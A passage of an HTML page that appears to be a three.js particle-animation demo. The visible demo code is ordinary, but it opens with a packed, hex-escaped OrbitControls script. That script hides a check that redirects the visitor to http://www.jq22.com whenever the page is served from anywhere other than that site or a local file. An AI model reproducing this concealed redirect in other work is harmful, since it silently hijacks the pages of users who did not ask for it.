\\x33\\x3a\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x54\\x3b\\x55\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x44\\x3b\\x32\\x73\\x3a\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x7d\\x68 \\x31\\x52\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x62\\x2e\\x32\\x70\\x28\\x29\\x3b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x32\\x31\\x28\\x62\\x2e\\x6d\\x2e\\x31\\x70\\x29\\x7b\\x43 \\x31\\x3a\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x32\\x32\\x29\\x67\\x3b\\x59\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x31\\x30\\x2e\\x31\\x62\\x28\\x59\\x2c\\x5a\\x29\\x3b\\x39\\x2e\\x31\\x6f\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x78\\x2f\\x41\\x2e\\x32\\x35\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x39\\x2e\\x32\\x30\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x79\\x2f\\x41\\x2e\\x31\\x64\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x5a\\x2e\\x74\\x28\\x59\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x32\\x3a\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x31\\x50\\x29\\x67\\x3b\\x63 \\x31\\x37\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x50\\x3b\\x63 \\x31\\x36\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x4f\\x3b\\x63 \\x4d\\x3d\\x65\\x2e\\x32\\x36\\x28\\x31\\x37\\x2a\\x31\\x37\\x2b\\x31\\x36\\x2a\\x31\\x36\\x29\\x3b\\x53\\x2e\\x72\\x28\\x30\\x2c\\x4d\\x29\\x3b\\x31\\x67\\x2e\\x31\\x62\\x28\\x53\\x2c\\x52\\x29\\x3b\\x64\\x28\\x31\\x67\\x2e\\x79\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x52\\x2e\\x74\\x28\\x53\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x33\\x3a\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x31\\x54\\x29\\x67\\x3b\\x57\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x56\\x2e\\x31\\x62\\x28\\x57\\x2c\\x55\\x29\\x3b\\x39\\x2e\\x73\\x28\\x56\\x2e\\x78\\x2c\\x56\\x2e\\x79\\x29\\x3b\\x55\\x2e\\x74\\x28\\x57\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x32\\x73\\x3a\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x7d\\x68 \\x32\\x46\\x28\\x29\\x7b\\x63 \\x32\\x44\\x3d\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x2e\\x32\\x78\\x28\\x30\\x2c\\x31\\x39\\x29\\x3b\\x63 \\x32\\x42\\x3d\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x2e\\x32\\x78\\x28\\x30\\x2c\\x34\\x29\\x3b\\x64\\x28\\x32\\x44\\x3d\\x3d\\x22\\x32\\x41\\x3a\\x2f\\x2f\\x32\\x79\\x2e\\x32\\x7a\\x2e\\x32\\x45\\x22\\x7c\\x7c\\x32\\x42\\x3d\\x3d\\x22\\x33\\x78\\x22\\x29\\x7b\\x7d\\x76\\x7b\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x3d\\x22\\x32\\x41\\x3a\\x2f\\x2f\\x32\\x79\\x2e\\x32\\x7a\\x2e\\x32\\x45\\x22\\x7d\\x7d\\x32\\x46\\x28\\x29\\x3b\\x68 \\x31\\x55\\x28\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x32\\x55\\'\\x2c\\x68\\x28\\x62\\x29\\x7b\\x62\\x2e\\x31\\x65\\x28\\x29\\x7d\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x32\\x54\\'\\x2c\\x32\\x43\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x33\\x61\\'\\x2c\\x31\\x51\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x33\\x63\\'\\x2c\\x31\\x51\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x58\\'\\x2c\\x31\\x58\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x55\\'\\x2c\\x31\\x55\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x52\\'\\x2c\\x31\\x52\\x2c\\x66\\x29\\x3b\\x31\\x75\\x2e\\x42\\x28\\'\\x33\\x65\\'\\x2c\\x32\\x72\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x75\\x28\\x29\\x7d\\x3b\\x6a\\x2e\\x31\\x49\\x2e\\x32\\x47\\x3d\\x33\\x34\\x2e\\x32\\x5a\\x28\\x6a\\x2e\\x33\\x36\\x2e\\x32\\x47\\x29\\x3b', 62, 220, '\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x73\\x63\\x6f\\x70\\x65\\x7c\\x74\\x68\\x69\\x73\\x7c\\x65\\x76\\x65\\x6e\\x74\\x7c\\x76\\x61\\x72\\x7c\\x69\\x66\\x7c\\x4d\\x61\\x74\\x68\\x7c\\x66\\x61\\x6c\\x73\\x65\\x7c\\x72\\x65\\x74\\x75\\x72\\x6e\\x7c\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x7c\\x6f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x54\\x48\\x52\\x45\\x45\\x7c\\x64\\x6f\\x6d\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x7c\\x53\\x54\\x41\\x54\\x45\\x7c\\x74\\x6f\\x75\\x63\\x68\\x65\\x73\\x7c\\x73\\x74\\x61\\x74\\x65\\x7c\\x6f\\x66\\x66\\x73\\x65\\x74\\x7c\\x6e\\x65\\x77\\x7c\\x74\\x72\\x75\\x65\\x7c\\x73\\x65\\x74\\x7c\\x70\\x61\\x6e\\x7c\\x63\\x6f\\x70\\x79\\x7c\\x75\\x70\\x64\\x61\\x74\\x65\\x7c\\x65\\x6c\\x73\\x65\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x7c\\x7c\\x7c\\x7c\\x65\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x7c\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x63\\x61\\x73\\x65\\x7c\\x62\\x72\\x65\\x61\\x6b\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x7c\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x7c\\x75\\x6e\\x64\\x65\\x66\\x69\\x6e\\x65\\x64\\x7c\\x70\\x68\\x69\\x7c\\x56\\x65\\x63\\x74\\x6f\\x72\\x32\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x53\\x63\\x61\\x6c\\x65\\x7c\\x61\\x6e\\x67\\x6c\\x65\\x7c\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x50\\x49\\x7c\\x70\\x61\\x67\\x65\\x59\\x7c\\x70\\x61\\x67\\x65\\x58\\x7c\\x74\\x65\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x53\\x74\\x61\\x72\\x74\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x45\\x6e\\x64\\x7c\\x70\\x61\\x6e\\x4f\\x66\\x66\\x73\\x65\\x74\\x7c\\x70\\x61\\x6e\\x53\\x74\\x61\\x72\\x74\\x7c\\x70\\x61\\x6e\\x44\\x65\\x6c\\x74\\x61\\x7c\\x70\\x61\\x6e\\x45\\x6e\\x64\\x7c\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6e\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x45\\x6e\\x64\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x53\\x74\\x61\\x72\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x44\\x65\\x6c\\x74\\x61\\x7c\\x4e\\x4f\\x4e\\x45\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x59\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x58\\x7c\\x6e\\x6f\\x50\\x61\\x6e\\x7c\\x56\\x65\\x63\\x74\\x6f\\x72\\x33\\x7c\\x64\\x79\\x7c\\x64\\x78\\x7c\\x72\\x61\\x64\\x69\\x75\\x73\\x7c\\x7c\\x6e\\x6f\\x5a\\x6f\\x6f\\x6d\\x7c\\x73\\x75\\x62\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x73\\x63\\x61\\x6c\\x65\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x48\\x65\\x69\\x67\\x68\\x74\\x7c\\x70\\x72\\x65\\x76\\x65\\x6e\\x74\\x44\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x44\\x65\\x6c\\x74\\x61\\x7c\\x6b\\x65\\x79\\x50\\x61\\x6e\\x53\\x70\\x65\\x65\\x64\\x7c\\x45\\x50\\x53\\x7c\\x6b\\x65\\x79\\x73\\x7c\\x6e\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x44\\x65\\x6c\\x74\\x61\\x7c\\x74\\x79\\x70\\x65\\x7c\\x61\\x64\\x64\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x4c\\x65\\x66\\x74\\x7c\\x6c\\x65\\x6e\\x67\\x74\\x68\\x7c\\x73\\x74\\x61\\x72\\x74\\x45\\x76\\x65\\x6e\\x74\\x7c\\x64\\x65\\x6c\\x74\\x61\\x7c\\x63\\x6c\\x6f\\x6e\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x7c\\x77\\x69\\x6e\\x64\\x6f\\x77\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x4f\\x75\\x74\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x49\\x6e\\x7c\\x70\\x68\\x69\\x44\\x65\\x6c\\x74\\x61\\x7c\\x65\\x6e\\x64\\x45\\x76\\x65\\x6e\\x74\\x7c\\x67\\x65\\x74\\x41\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x69\\x6f\\x6e\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x6c\\x61\\x73\\x74\\x50\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x7c\\x67\\x65\\x74\\x5a\\x6f\\x6f\\x6d\\x53\\x63\\x61\\x6c\\x65\\x7c\\x62\\x75\\x74\\x74\\x6f\\x6e\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x4d\\x6f\\x76\\x65\\x7c\\x70\\x61\\x6e\\x55\\x70\\x7c\\x6c\\x61\\x73\\x74\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x73\\x69\\x6e\\x7c\\x4f\\x72\\x62\\x69\\x74\\x43\\x6f\\x6e\\x74\\x72\\x6f\\x6c\\x73\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x55\\x70\\x7c\\x70\\x61\\x6e\\x4c\\x65\\x66\\x74\\x7c\\x50\\x41\\x4e\\x7c\\x64\\x65\\x6c\\x74\\x61\\x58\\x7c\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x57\\x68\\x65\\x65\\x6c\\x7c\\x74\\x6f\\x75\\x63\\x68\\x6d\\x6f\\x76\\x65\\x7c\\x64\\x65\\x6c\\x74\\x61\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x50\\x41\\x4e\\x7c\\x74\\x6f\\x75\\x63\\x68\\x65\\x6e\\x64\\x7c\\x6d\\x61\\x78\\x7c\\x71\\x75\\x61\\x74\\x7c\\x74\\x6f\\x75\\x63\\x68\\x73\\x74\\x61\\x72\\x74\\x7c\\x62\\x6f\\x64\\x79\\x7c\\x6d\\x69\\x6e\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x55\\x70\\x7c\\x73\\x77\\x69\\x74\\x63\\x68\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x68\\x72\\x65\\x66\\x7c\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x57\\x69\\x64\\x74\\x68\\x7c\\x73\\x71\\x72\\x74\\x7c\\x71\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x45\\x76\\x65\\x6e\\x74\\x7c\\x65\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x73\\x7c\\x6d\\x61\\x78\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x69\\x6e\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x71\\x75\\x61\\x74\\x49\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x74\\x6f\\x70\\x7c\\x73\\x75\\x62\\x7c\\x63\\x6f\\x73\\x7c\\x61\\x70\\x70\\x6c\\x79\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x61\\x74\\x72\\x69\\x78\\x7c\\x66\\x6f\\x76\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x6d\\x75\\x6c\\x74\\x69\\x70\\x6c\\x79\\x53\\x63\\x61\\x6c\\x61\\x72\\x7c\\x6d\\x69\\x6e\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x6d\\x61\\x78\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x61\\x74\\x61\\x6e\\x32\\x7c\\x73\\x74\\x6f\\x70\\x50\\x72\\x6f\\x70\\x61\\x67\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x52\\x49\\x47\\x48\\x54\\x7c\\x6f\\x6e\\x4b\\x65\\x79\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x55\\x50\\x7c\\x6e\\x6f\\x4b\\x65\\x79\\x73\\x7c\\x4c\\x45\\x46\\x54\\x7c\\x42\\x4f\\x54\\x54\\x4f\\x4d\\x7c\\x73\\x75\\x62\\x73\\x74\\x72\\x7c\\x77\\x77\\x77\\x7c\\x6a\\x71\\x32\\x32\\x7c\\x68\\x74\\x74\\x70\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x32\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x7c\\x63\\x6f\\x6d\\x7c\\x6a\\x71\\x70\\x64\\x7c\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65\\x7c\\x7a\\x6f\\x6f\\x6d\\x53\\x70\\x65\\x65\\x64\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x6d\\x6f\\x76\\x65\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x30\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x30\\x7c\\x36\\x30\\x7c\\x77\\x68\\x65\\x65\\x6c\\x44\\x65\\x6c\\x74\\x61\\x7c\\x72\\x65\\x6d\\x6f\\x76\\x65\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x75\\x70\\x7c\\x64\\x65\\x74\\x61\\x69\\x6c\\x7c\\x74\\x61\\x6e\\x7c\\x49\\x6e\\x66\\x69\\x6e\\x69\\x74\\x79\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x64\\x6f\\x77\\x6e\\x7c\\x63\\x6f\\x6e\\x74\\x65\\x78\\x74\\x6d\\x65\\x6e\\x75\\x7c\\x31\\x38\\x30\\x7c\\x72\\x69\\x67\\x68\\x74\\x7c\\x75\\x70\\x7c\\x63\\x65\\x6e\\x74\\x65\\x72\\x7c\\x63\\x72\\x65\\x61\\x74\\x65\\x7c\\x34\\x30\\x7c\\x73\\x74\\x61\\x72\\x74\\x7c\\x65\\x6e\\x64\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x7c\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x69\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x45\\x76\\x65\\x6e\\x74\\x44\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x65\\x72\\x7c\\x7c\\x7c\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x77\\x68\\x65\\x65\\x6c\\x7c\\x30\\x30\\x30\\x30\\x30\\x31\\x7c\\x44\\x4f\\x4d\\x4d\\x6f\\x75\\x73\\x65\\x53\\x63\\x72\\x6f\\x6c\\x6c\\x7c\\x73\\x65\\x74\\x46\\x72\\x6f\\x6d\\x55\\x6e\\x69\\x74\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\\x7c\\x6c\\x65\\x66\\x74\\x7c\\x72\\x65\\x73\\x65\\x74\\x7c\\x6b\\x65\\x79\\x43\\x6f\\x64\\x65\\x7c\\x63\\x61\\x6d\\x65\\x72\\x61\\x7c\\x64\\x69\\x73\\x61\\x62\\x6c\\x65\\x64\\x7c\\x6c\\x6f\\x6f\\x6b\\x41\\x74\\x7c\\x39\\x35\\x7c\\x70\\x6f\\x77\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x54\\x6f\\x53\\x71\\x75\\x61\\x72\\x65\\x64\\x7c\\x64\\x6f\\x74\\x7c\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x7c\\x62\\x6f\\x74\\x74\\x6f\\x6d\\x7c\\x65\\x6e\\x63\\x6f\\x75\\x6e\\x74\\x65\\x72\\x65\\x64\\x7c\\x57\\x41\\x52\\x4e\\x49\\x4e\\x47\\x7c\\x6a\\x73\\x7c\\x77\\x61\\x72\\x6e\\x7c\\x75\\x6e\\x6b\\x6e\\x6f\\x77\\x6e\\x7c\\x61\\x6e\\x7c\\x66\\x69\\x6c\\x65' [\"\\x73\\x70\\x6c\\x69\\x74\"]('\\x7c'), 0, {}))\n  </script>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    cursor: move;\n  }\n  </style>\n</head>\n\n<body>\n  <div id=\"three-container\">\n    \n  </div>\n  <script>\n  var mContainer;\n  var mCamera, mRenderer;\n  var mControls;\n  var mScene;\n  var mParticleCount = 100000;\n  var mParticleSystem;\n  var mTime = 0.0;\n  var mTimeStep = (1 / 60);\n  var mDuration = 25;\n  window.onload = function() {\n    init()\n  };\n\n  function init() {\n    initTHREE();\n    initControls();\n    initParticleSystem();\n    requestAnimationFrame(tick);\n    window.addEventListener('resize', resize, false)\n  }\n\n  function initTHREE() {\n    mRenderer = new THREE.WebGLRenderer({\n      antialias: true\n    });\n    mRenderer.setSize(window.innerWidth, window.innerHeight);\n    mContainer = document.getElementById('three-container');\n    mContainer.appendChild(mRenderer.domElement);\n    mCamera = new THREE.PerspectiveCamera(50, window.innerWidth / window.innerHeight, 0.1, 5000);\n    mCamera.position.set(0, 600, 600);\n    mScene = new THREE.Scene();\n    var light;\n    light = new THREE.PointLight(0xffffff, 5, 1000, 2);\n    light.position.set(0, 400, 0);\n    mScene.add(light)\n  }\n\n  function initControls() {\n    mControls = new THREE.OrbitControls(mCamera, mRenderer.domElement)\n  }\n\n  function initParticleSystem() {\n    var prefabGeometry = new THREE.PlaneGeometry(4, 4);\n    var bufferGeometry = new THREE.BAS.PrefabBufferGeometry(prefabGeometry, mParticleCount);\n    bufferGeometry.computeVertexNormals();\n    var aOffset = bufferGeometry.createAttribute('aOffset', 1);\n    var aStartPosition = bufferGeometry.createAttribute('aStartPosition', 3);\n    var aControlPoint1 = bufferGeometry.createAttribute('aControlPoint1', 3);\n    var aControlPoint2 = bufferGeometry.createAttribute('aControlPoint2', 3);\n    var aEndPosition = bufferGeometry.createAttribute('aEndPosition', 3);\n    var aAxisAngle = bufferGeometry.createAttribute('aAxisAngle', 4);\n    var aColor = bufferGeometry.createAttribute('color', 3);\n    var i, j, offset;\n    var delay;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      delay = i / mParticleCount * mDuration;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aOffset.array[offset++] = delay\n      }\n    }\n    var x, y, z;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = -1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aStartPosition.array[offset++] = x;\n        aStartPosition.array[offset++] = y;\n        aStartPosition.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(400, 600);\n      z = THREE.Math.randFloat(-1200, -800);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint1.array[offset++] = x;\n        aControlPoint1.array[offset++] = y;\n        aControlPoint1.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = THREE.Math.randFloat(-400, 400);\n      y = THREE.Math.randFloat(-600, -400);\n      z = THREE.Math.randFloat(800, 1200);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aControlPoint2.array[offset++] = x;\n        aControlPoint2.array[offset++] = y;\n        aControlPoint2.array[offset++] = z\n      }\n    }\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      x = 1000;\n      y = 0;\n      z = 0;\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aEndPosition.array[offset++] = x;\n        aEndPosition.array[offset++] = y;\n        aEndPosition.array[offset++] = z\n      }\n    }\n    var axis = new THREE.Vector3();\n    var angle = 0;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      axis.x = THREE.Math.randFloatSpread(2);\n      axis.y = THREE.Math.randFloatSpread(2);\n      axis.z = THREE.Math.randFloatSpread(2);\n      axis.normalize();\n      angle = Math.PI * THREE.Math.randInt(16, 32);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aAxisAngle.array[offset++] = axis.x;\n        aAxisAngle.array[offset++] = axis.y;\n        aAxisAngle.array[offset++] = axis.z;\n        aAxisAngle.array[offset++] = angle\n      }\n    }\n    var color = new THREE.Color();\n    var h, s, l;\n    for (i = 0, offset = 0; i < mParticleCount; i++) {\n      h = i / mParticleCount;\n      s = THREE.Math.randFloat(0.4, 0.6);\n      l = THREE.Math.randFloat(0.4, 0.6);\n      color.setHSL(h, s, l);\n      for (j = 0; j < prefabGeometry.vertices.length; j++) {\n        aColor.array[offset++] = color.r;\n        aColor.array[offset++] = color.g;\n        aColor.array[offset++] = color.b\n      }\n    }\n    var material = new THREE.BAS.PhongAnimationMaterial({\n      vertexColors: THREE.VertexColors,\n      shading: THREE.FlatShading,\n      side: THREE.DoubleSide,\n      uniforms: {\n        uTime: {\n          type: 'f',\n          value: 0\n        },\n        uDuration: {\n          type: 'f',\n          value: mDuration\n        }\n      },\n      shaderFunctions: [THREE.BAS.ShaderChunk['quaternion_rotation'], THREE.BAS.ShaderChunk['cubic_bezier']],\n      shaderParameters: ['uniform float uTime;', 'uniform float uDuration;', 'attribute float aOffset;', 'attribute vec3 aStartPosition;', 'attribute vec3 aControlPoint1;', 'attribute vec3 aControlPoint2;', 'attribute vec3 aEndPosition;', 'attribute vec4 aAxisAngle;'],\n      shaderVertexInit: ['float tProgress = mod((uTime + aOffset), uDuration) / uDuration;', 'float angle = aAxisAngle.w * tProgress;', 'vec4 tQuat = quatFromAxisAngle(aAxisAngle.xyz, angle);'],\n      shaderTransformNormal: ['objectNormal = rotateVector(tQuat, objectNormal);'],\n      shaderTransformPosition: ['transformed = rotateVector(tQuat, transformed);', 'transformed += cubicBezier(aStartPosition, aControlPoint1, aControlPoint2, aEndPosition, tProgress);']\n    }, {\n      specular: 0xff0000,\n      shininess: 20\n    });\n    mParticleSystem = new THREE.Mesh(bufferGeometry, material);\n    mParticleSystem.frustumCulled = false;\n    mScene.add(mParticleSystem)\n  }\n\n  function tick() {\n    update();\n    render();\n    mTime += mTimeStep;\n    mTime %= mDuration;\n    requestAnimationFrame(tick)\n  }\n\n  function update() {\n    mControls.update();\n    mParticleSystem.material.uniforms['uTime'].value = mTime\n  }\n\n  function render() {\n    mRenderer.render(mScene, mCamera)\n  }\n\n  function resize() {\n    mCamera.aspect = window.innerWidth / window.innerHeight;\n    mCamera.updateProjectionMatrix();\n    mRenderer.setSize(window.innerWidth, window.innerHeight)\n  }\n  THREE.BAS = {};\n  THREE.BAS.ShaderChunk = {};\n  THREE.BAS.ShaderChunk[\"animation_time\"] = \"float tDelay = aAnimation.x;\\nfloat tDuration = aAnimation.y;\\nfloat tTime = clamp(uTime - tDelay, 0.0, tDuration);\\nfloat tProgress = ease(tTime, 0.0, 1.0, tDuration);\\n\";\n  THREE.BAS.ShaderChunk[\"cubic_bezier\"] = \"vec3 cubicBezier(vec3 p0, vec3 c0, vec3 c1, vec3 p1, float t)\\n{\\n    vec3 tp;\\n    float tn = 1.0 - t;\\n\\n    tp.xyz = tn * tn * tn * p0.xyz + 3.0 * tn * tn * t * c0.xyz + 3.0 * tn * t * t * c1.xyz + t * t * t * p1.xyz;\\n\\n    return tp;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_in_quad\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*(t/=d)*t + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"ease_out_cubic\"] = \"float ease(float t, float b, float c, float d) {\\n  return c*((t=t/d - 1.0)*t*t + 1.0) + b;\\n}\\n\";\n  THREE.BAS.ShaderChunk[\"quaternion_rotation\"] = \"vec3 rotateVector(vec4 q, vec3 v)\\n{\\n    return v + 